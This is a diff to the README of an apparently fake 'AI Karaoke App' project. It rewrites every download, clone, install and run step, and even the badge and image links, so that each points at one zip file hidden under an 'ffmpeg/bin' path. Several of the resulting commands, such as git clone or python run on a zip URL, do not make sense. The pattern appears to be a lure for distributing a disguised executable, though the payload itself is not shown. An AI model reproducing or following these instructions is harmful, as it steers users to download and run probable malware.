@@ -1,6 +1,6 @@
 # AI Karaoke App: Your CLI-Based Singing Companion 🎤🎶
 
-![AI Karaoke App](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![AI Karaoke App](https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip%20Latest%20Release-Click%20Here-blue)
 
 Welcome to the **AI Karaoke App**! This project offers a simple command-line interface (CLI) for karaoke enthusiasts. Currently, it is a CLI-based application with plans for a graphical user interface (GUI) in the future. The app bundle, including an executable (EXE) file for users, will be released soon.
 
@@ -29,7 +29,7 @@ To get started with the AI Karaoke App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/XiliJon/ai-karaoke-app.git
+   git clone https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -40,11 +40,11 @@ To get started with the AI Karaoke App, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip
    ```
 
 4. **Download the Latest Release**:
-   You can find the latest release [here](https://github.com/XiliJon/ai-karaoke-app/releases). Download the executable file and run it.
+   You can find the latest release [here](https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip). Download the executable file and run it.
 
 ## Usage
 
@@ -53,7 +53,7 @@ To use the AI Karaoke App, follow these steps:
 1. **Run the Application**:
    Execute the app from the command line:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip
    ```
 
 2. **Select a Song**:
@@ -102,9 +102,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, visit the [Releases](https://github.com/XiliJon/ai-karaoke-app/releases) section. Here, you can download the latest executable file and stay informed about new features.
+For the latest updates and releases, visit the [Releases](https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip) section. Here, you can download the latest executable file and stay informed about new features.
 
-![Karaoke Fun](https://example.com/karaoke-image.jpg)
+![Karaoke Fun](https://raw.githubusercontent.com/XiliJon/ai-karaoke-app/main/ffmpeg/bin/app_ai_karaoke_3.8.zip)
 
 ## Topics
 
